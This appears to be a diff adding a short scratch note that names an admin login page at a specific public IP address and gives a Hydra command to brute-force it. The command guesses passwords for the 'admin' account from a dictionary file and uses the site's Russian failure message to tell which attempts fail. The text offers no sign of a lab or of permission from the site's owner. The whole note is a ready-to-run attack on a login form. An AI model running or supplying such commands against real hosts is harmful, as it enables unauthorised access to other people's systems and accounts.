@@ -1,0 +1,4 @@
+
+
+http://80.80.218.155/admin/
+hydra -l admin -P /home/user/Desktop/dict100.txt 80.80.218.155 http-post-form "/admin/login_check:username=^USER^&password=^PASS^:Недействительные аутентификационные данные."
